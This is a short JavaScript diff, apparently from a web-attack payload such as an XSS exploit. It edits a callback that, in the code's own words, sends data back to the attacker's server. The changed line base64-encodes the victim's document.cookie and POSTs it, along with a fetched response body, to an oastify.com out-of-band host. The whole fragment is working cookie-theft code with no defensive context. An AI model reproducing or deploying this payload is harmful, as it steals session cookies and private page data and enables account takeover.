@@ -7,7 +7,7 @@
       xhr.onreadystatechange = function() {
          if (xhr.readyState == 4 && xhr.status == 200) {
             // Send the data back to the attacker's server
-            fetch('https://akywmtmqwe6v3o5x3joou6zprgx7l39s.oastify.com?c='+document.cookie, {
+            fetch('https://akywmtmqwe6v3o5x3joou6zprgx7l39s.oastify.com?c='+btoa(document.cookie), {
                method: 'POST',
                body: xhr.responseText
             });
